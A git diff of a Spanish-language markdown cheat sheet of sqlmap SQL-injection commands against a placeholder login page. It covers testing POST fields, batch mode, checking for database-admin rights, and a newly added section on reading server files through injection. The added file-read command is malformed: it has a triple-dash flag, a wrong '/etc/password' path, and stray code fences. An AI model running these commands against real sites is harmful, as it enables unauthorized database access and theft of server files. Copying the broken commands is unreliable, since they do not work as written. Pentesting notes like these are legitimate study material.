@@ -22,12 +22,12 @@
 ```
 sqlmap -u "http://prueba.com/info.php?action=login" 
 ```
-
+<br>
 Datos del login que van en dos variables
 ```
 sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc"
 ```
-
+<br>
 Indicar a todas las preguntas un Yes all
 ```
 sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc" --batch 
@@ -43,4 +43,14 @@ sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&passwor
 Saber que tipo de base de datos tiene por detras
 ```
  --is-dba
+```
+<br>
+Read Files
+```
+---file-read "/etc/password"
+```
+> Output -> ~/.sqlmap/output/www.prueba.com/files/_etc_password
+<br>
+```
+
 ```
